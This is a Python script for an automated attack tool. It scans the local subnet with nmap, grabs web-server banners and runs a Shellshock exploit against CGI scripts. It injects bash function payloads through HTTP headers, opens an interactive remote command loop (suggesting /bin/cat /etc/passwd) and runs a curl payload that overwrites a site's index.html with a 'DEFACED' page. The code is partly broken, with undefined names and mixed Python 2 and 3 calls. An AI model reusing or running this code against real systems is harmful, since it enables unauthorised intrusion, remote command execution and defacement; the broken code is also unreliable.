import socket
import os
import sys
import nmap
#from nmap import PortScannerAsync
import ipaddress
import time
import subprocess 
try:
    # For Python 3.0 and later
    from urllib.request import urlopen
except ImportError:
    # Fall back to Python 2's urllib2
    from urllib2 import urlopen
try:
    from StringIO import StringIO
except ImportError:
    from io import StringIO
import string
import random
import signal
#import Queue
import threading
import re
from collections import OrderedDict

def prompt_sudo():
    ret = 0
    if os.geteuid() != 0:
        msg = "[sudo] password for %u:"
        ret = subprocess.check_call("sudo -v -p '%s'" % msg, shell=True)
    return ret

if prompt_sudo() != 0:
    # the user wasn't authenticated as a sudoer, exit?
    print("\n\nPlease Run as su \n\n")
#print('ID | Client Address     | OS             | Hostname\n---------------------------------------------------')
#        for k, v in self.clients.items():
#            print('{:>2} | {}\t| {}\t | {}'.format(k, v.addr[0], self.os[k], self.hostnames[k].replace(".local", "")))
#color
#nma = nmap.PortScannerAsync()
clear = lambda: os.system('clear')
def get_lan_ip():
    ip = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = ["eth0","eth1","eth2","wlan0","wlan1","wifi0","ath0","ath1","ppp0"]
        for ifname in interfaces:
            try:
                ip = get_interface_ip(ifname)
                break;
            except IOError:
                pass
    return ip
class colors:
    '''Colors class:
    reset all colors with colors.reset
    two subclasses fg for foreground and bg for background.
    use as colors.subclass.colorname.
    i.e. colors.fg.red or colors.bg.green
    also, the generic bold, disable, underline, reverse, strikethrough,
    and invisible work with the main class
    i.e. colors.bold
    '''
    reset='\033[0m'
    bold='\033[01m'
    disable='\033[02m'
    underline='\033[04m'
    reverse='\033[07m'
    strikethrough='\033[09m'
    invisible='\033[08m'
    class fg:
        black='\033[30m'
        red='\033[31m'
        green='\033[32m'
        orange='\033[33m'
        blue='\033[34m'
        purple='\033[35m'
        cyan='\033[36m'
        lightgrey='\033[37m'
        darkgrey='\033[90m'
        lightred='\033[91m'
        lightgreen='\033[92m'
        yellow='\033[93m'
        lightblue='\033[94m'
        pink='\033[95m'
        lightcyan='\033[96m'
    class bg:
        black='\033[40m'
        red='\033[41m'
        green='\033[42m'
        orange='\033[43m'
        blue='\033[44m'
        purple='\033[45m'
        cyan='\033[46m'
        lightgrey='\033[47m'
#MAIN COLORS
cyan = "\033[1;36;40m"
reset = "\033[1;37;40m"
red = "\033[1;31;40m"
green = "\033[1;32;40m"
yellow = "\033[1;33;40m"
def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """
    
    counter = 0
    number_of_targets = len (host_target_list)
    confirmed_hosts = [] # List of resoveable and reachable hosts
    if number_of_targets > 1:
        print("[+] Checking connectivity to targets...")
    else:
        print("[+] Checking connectivity with target...")
    for host in host_target_list:
        counter += 1
        # Show a progress bar unless verbose or there is only 1 host 
        if not verbose and number_of_targets > 1: 
            print_progress(number_of_targets, counter) 

        try:
            if verbose: print("[I] Checking to see if %s resolves..." % host)
            ipaddr = socket.gethostbyname(host)
            if verbose: print ("[I] Resolved ok")
            if verbose: print ("[I] Checking to see if %s is reachable on port %s..." % (host, port))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print("[I] %s seems reachable..." % host)
            confirmed_hosts.append(host)
        except Exception as e:
            print("[!] Exception - %s: %s" % (host, e))
            print("[!] Omitting %s from target list..." % host)
    if len(host_target_list) > 1:
        print("[+] %i of %i targets were reachable" %(len(confirmed_hosts), number_of_targets))
    elif len(confirmed_hosts) == 1:
        print("[+] Target was reachable")
    else:
        print("[+] Host unreachable")
    return confirmed_hosts


def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check. 
    """

    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []
    
    for host in host_target_list:
        print("[+] Looking for vulnerabilities on %s:%s" % (host, port))
        cgi_index = 0
        for cgi in cgi_list:
            cgi_index += 1

            # Show a progress bar unless verbose or there is only 1 cgi 
            if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index) 

            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")    
                
                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", user_agent)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)
                
                thread_pool.acquire()
                
                # Start a thread for each CGI in cgi_list
                if verbose: print("[I] Starting thread %i" % cgi_index)
                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e: 
                if verbose: print("[I] %s - %s" % (url, e))
            finally:
                pass

        # Wait for all the threads to finish before moving on    
        for thread in threads:
            thread.join()
    
        # Pop any results from the Queue and add them to the list of potentially 
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())
    
    if verbose: print("[+] Finished host scan")
    return exploit_targets

def do_check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """

    try:
        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print("[I] %s for %s" % (e, req.get_full_url()) )
    finally:
        thread_pool.release()

def do_exploit_cgi(proxy, target_list, command, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """

    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # Dictionary {header:attack string} to try on discovered CGI scripts
    # Where attack string comprises exploit + success_flag + command
    attacks = {
       "Content-type": "() { :;}; echo; "
       }
    
    # A dictionary of apparently successfully exploited targets
    # {url: (header, exploit)}
    # Returned to main() 
    successful_targets = OrderedDict()

    if len(target_list) > 1:
        print("[+] %i potential targets found, attempting exploits" % len(target_list))
    else:
        print("[+] 1 potential target found, attempting exploits")
    for target in target_list:
        if verbose: print("[+] Trying exploit for %s" % target)
        if verbose: print("[I] Flag set to: %s" % success_flag)
        for header, exploit in attacks.iteritems():
            attack = exploit + " echo " + success_flag + "; " + command
            result = do_attack(proxy, target, header, attack, verbose)
            if success_flag in result:
                if verbose: 
                    print("[!] %s looks vulnerable" % target )
                    print("[!] Response returned was:" )
                    buf = StringIO.StringIO(result)
                    if len(result) > (len(success_flag)):
                        for line in buf:
                            if line.strip() != success_flag: 
                                print("  %s" % line.strip())
                    else:
                        print("[!] A result was returned but was empty...")
                        print("[!] Maybe try a different exploit command?")
                    buf.close()
                successful_targets.update({target: (header, exploit)})
            else:
                if verbose: print("[-] Not vulnerable" )
    return successful_targets
def do_attack(proxy, target, header, attack, verbose):
    result = ""
    host = target.split(":")[1][2:] # substring host from target URL

    try:
        if verbose:
            print("[I] Header is: %s" % header)
            print("[I] Attack string is: %s" % attack)
        req = urllib2.Request(target)
        req.add_header(header, attack)
        if proxy:
            req.set_proxy(proxy, "http")    
            if verbose: print("[I] Proxy set to: %s" % str(proxy))
        req.add_header("User-Agent", user_agent)
        req.add_header("Host", host)
        resp = urllib2.urlopen(req, None, TIMEOUT)
        result =  resp.read()
    except Exception as e:
        if verbose: print("[I] %s - %s" % (target, e))
    finally:
        pass
    return result
# User-agent to use instead of 'Python-urllib/2.6' or similar
user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """

    sys.exit(0)
# Timeout for urllib2.urlopen requests
TIMEOUT = 5
#HTTP EXPLOITS

    
def ask_for_console(proxy, successful_targets, verbose):
    """ With any discovered vulnerable servers asks user if they
    would like to choose one of these to send further commands to
    in a semi interactive way
    successful_targets is a dictionary:
    {url: (header, exploit)}
    """

    # Initialise to non zero to enter while loop
    user_input = 1
    ordered_url_list = successful_targets.keys()
    
    while user_input is not 0:
        result = ""
        print("[+] The following URLs appear to be exploitable:")
        for x in range(len(ordered_url_list)):
            print("  [%i] %s" % (x+1, ordered_url_list[x]))
        print("[+] Would you like to exploit further?")
        user_input = input("[>] Enter an URL number or 0 to exit: ")
        sys.stdout.flush()
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print("[-] Please enter a number between 1 and %i (0 to exit)" % len(successful_targets))
            continue
        elif not user_input:
            continue
        target = ordered_url_list[user_input-1]
        header = successful_targets[target][0]
        print("[+] Entering interactive mode for %s" % target)
        print("[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'")

        while True:
            command = ""
            result = ""
            sys.stdout.flush()
            command = raw_input("  > ")
            sys.stdout.flush()
            if command == "quit":
                sys.stdout.flush()
                print("[+] Exiting interactive mode...")
                sys.stdout.flush()
                break
            if command:
                attack = successful_targets[target][1] + command
                result = do_attack(proxy, target, header, attack, verbose)
            else:
                result = ""
            if result: 
                buf = StringIO.StringIO(result)
                for line in buf:
                    sys.stdout.flush()
                    print("  < %s" % line.strip())
                    sys.stdout.flush()
            else:
                sys.stdout.flush()
                print("  > No response")
                sys.stdout.flush()


def validate_address(hostaddress, debug):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """

    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if debug: print("[D] Evaluating host '%s'" % hostaddress)
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True 
    else:
        print("Host %s appears invalid, exiting..." % hostaddress)
        exit(0)


def get_targets_from_file(file_name, debug):
    """ Import targets to scan from file
    """

    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line, debug):
                host_target_list.append(line)
    print("[+] %i hosts imported from %s" % (len(host_target_list), file_name))
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """

    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print("[+] %i potential targets imported from %s" % (len(cgi_list), file_name))
    return cgi_list


def print_progress(
                total,
                count,
                lbracket = "[",
                rbracket = "]",
                completed = "*",
                incomplete = "-",
                bar_size  = 50
                ): 
    percentage_progress = (100.0/float(total))*float(count)
    bar = int(bar_size * percentage_progress/100)
    print(lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r"),
    if percentage_progress == 100: print("\n")
def shellshock(ip,port):
    payload = """
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://{0}:{1}/cgi-bin/vulnerable
    """.format(ip, port)
#    stdout.write("\r|ShellShock|\t\t["+yellow+"INC"+colors.reset+"]")
#    stdout.flush()
#    run exploit and get result
    result_init = os.popen(payload).read()
    result_check = os.popen("http://"+ip+":"+port).read()
    print(result_check)
    attacks = {
       "Content-type": "() { :;}; echo; "
       }
    verbose = True
    host_target_list = [ip]
    proxy = ""
#    can change
    command = "uname -a"
    if port == "443":
        protocol = "https"
    else:
        protocol = "http"
#    thread_pool = threading.BoundedSemaphore("50")
    cgi_list = import_cgi_list_from_file("shocker-cgi_list.txt")
    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)

    # If any cgi scripts were found on the target host try to exploit them
    if len(target_list):
        successful_targets = do_exploit_cgi(proxy, target_list, command, verbose)
        if len(successful_targets):
            ask_for_console(proxy, successful_targets, verbose)
        else:
            print("[-] All exploit attempts failed")
    else:
        print("[+] No targets found to exploit")
    
print('['+colors.fg.red+colors.bold+'1/3'+colors.reset+'] Starting Host Discovery Scan '+colors.reset)
print('['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Local IP - '+colors.fg.cyan+colors.bold+str(get_lan_ip()) + colors.reset)
locip = get_lan_ip()
subnet = str(ipaddress.ip_network(str(locip)+'/255.255.255.0', strict=False))
print('['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Param - '+colors.fg.cyan+colors.bold+str(subnet) + colors.reset)
id = 0
hosts_ = []
#print info
#def callback_result(host, scan_result):
#    hosts[id] = host
#    print('['+colors.fg.cyan+colors.bold+str(id)+colors.reset+'] '+host+' ('+colors.fg.blue+scan_result['nmap']['scanstats'].hostname()+colors.reset+')')
#    id = id + 1
#nma.scan(hosts=subnet, arguments='-sP', callback=callback_result)
print('['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Format - ['+colors.fg.cyan+colors.bold+'id'+colors.reset+'] ip ('+colors.fg.blue+colors.bold+'vendor'+colors.reset+') '+colors.reset)
time.sleep(1.2)
clear()
print('['+colors.fg.red+colors.bold+'1/3'+colors.reset+'] Host Discovery Scan '+colors.reset)
nm = nmap.PortScanner()
nm.scan(hosts=str(subnet), arguments='-n -sP -PE -PA21,23,80,3389')
for host in nm.all_hosts():
    
        
#    print('%s (%s)' % (host, nm[host]['vendor']))
    print('['+colors.fg.cyan+colors.bold+str(id)+colors.reset+'] '+host+' ('+colors.fg.blue+colors.bold+str(nm[host]['vendor'])+colors.reset+') '+colors.reset)
    id = id + 1
    hosts_.append(host)
#    else:
#        print(host)
target_id = input("\nChoose a target (id): ")
time.sleep(1.2)
clear()
print('['+colors.fg.red+colors.bold+'2/3'+colors.reset+'] Starting Intense/Vuln Scan '+colors.reset)
print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Scanning for http/s servers on '+str(hosts_[int(target_id)]) + colors.reset)
#attempt to find HTTP/s server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((str(hosts_[int(target_id)]),80))
http_serv = False
https_serv = False
http_serv_type = ""
if result == 0:
    http_serv = True
    print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] Discovered HTTP server on '+colors.fg.lightblue+ str(hosts_[int(target_id)]) + colors.reset)
#   print("Port is open")
   
    
    
else:
   print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] No HTTP server detected on '+colors.fg.lightblue+ str(hosts_[int(target_id)]) + colors.reset)
https = sock.connect_ex((str(hosts_[int(target_id)]),443))
result2 = sock.connect_ex((str(hosts_[int(target_id)]),443))
if result2 == 0:
    https_serv = True
    print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] Discovered HTTPS server on '+colors.fg.lightblue+ str(hosts_[int(target_id)]) + colors.reset)
#   print("Port is open")
   
    
else:
   print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] No HTTPS server detected on '+colors.fg.lightblue+ str(hosts_[int(target_id)]) + colors.reset)

if http_serv != True and https_serv != True:
    print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] No port 80/443 servers discovered. Moving on to ssh/OS scan. ' + colors.reset)
#    http serv but no https
elif http_serv == True and https_serv != True:
    print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Attempting to grab HTTP server type on '+colors.fg.lightblue+str(hosts_[int(target_id)]) + colors.reset)
#    GET SERVER TYPE/VERSION
    s = socket.socket()

    s.connect((str(hosts_[int(target_id)]),80))
    s.send("GET / HTTP/1.0\r\n\r\n")
    banner = s.recv(1024)
    for item in banner.split("\n"):
        if "Server: " in item:
#            PRINT RESULTS NICELLY
            print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] Server Version/Type is '+colors.fg.lightblue+colors.bold+(item.strip()).replace("Server: ", "")+colors.reset)
            http_serv_type = (item.strip()).replace("Server: ", "")
#    ATTEMPT TO GAIN SHELL VIA KNOWN EXPLOITS
    print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Scanning for server Vuln on '+colors.fg.lightblue+str(hosts_[int(target_id)]) + colors.reset)
    shellshock(str(hosts_[int(target_id)]),"80")
elif http_serv == True and https_serv == True:
    print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Attempting to grab HTTP/S server type on '+colors.fg.lightblue+str(hosts_[int(target_id)]) + colors.reset)
#    GET SERVER TYPE/VERSION
    s = socket.socket()

    s.connect((str(hosts_[int(target_id)]),443))
    s.send("GET / HTTP/1.0\r\n\r\n")
    banner = s.recv(1024)
    for item in banner.split("\n"):
        if "Server: " in item:
#            PRINT RESULTS NICELLY
            print('\n['+colors.fg.cyan+colors.bold+'*'+colors.reset+'] Server Version/Type is '+colors.fg.lightblue+colors.bold+(item.strip()).replace("Server: ", "")+colors.reset)
            http_serv_type = (item.strip()).replace("Server: ", "")
#    ATTEMPT TO GAIN SHELL VIA KNOWN EXPLOITS
    print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Scanning for server Vuln on '+colors.fg.lightblue+str(hosts_[int(target_id)]) + colors.reset)
    shellshock(str(hosts_[int(target_id)]),"443")
    
print('\n['+colors.fg.cyan+colors.bold+'iNFO'+colors.reset+'] Performing OS Scan ' + colors.reset)
#scan ports for service versions and OS(-A argument) and -T4 to speed up
#nm.scan(hosts=str(hosts_[int(target_id)]), arguments="-A -T4")
nm.scan(hosts=str(hosts_[int(target_id)]), arguments="-O")

if 'osclass' in nm[str(hosts_[int(target_id)])]:
    for osclass in nm[str(hosts_[int(target_id)])]['osclass']:
        print('| OsClass.type : {0}'.format(osclass['type']))
        print('| OsClass.vendor : {0}'.format(osclass['vendor']))
        print('| OsClass.osfamily : {0}'.format(osclass['osfamily']))
        print('| OsClass.osgen : {0}'.format(osclass['osgen']))
        print('|_OsClass.accuracy : {0}'.format(osclass['accuracy']))
        print('')